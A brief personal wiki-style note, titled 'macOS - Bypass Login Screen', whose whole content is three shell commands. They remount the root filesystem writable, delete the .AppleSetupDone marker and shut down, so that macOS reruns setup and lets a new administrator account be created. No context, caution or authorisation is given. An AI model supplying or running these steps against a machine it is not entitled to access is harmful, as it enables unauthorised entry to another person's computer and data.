---
title: "macOS - Bypass Login Screen"
created: 2019-04-16T14:12:46.372-05:00
modified: 2019-08-31T00:09:28.047-05:00
parent: "[[macOS - General]]"
children: []
---
```bash
mount -uw /
rm /var/db/.AppleSetupDone
shutdown -h now
```
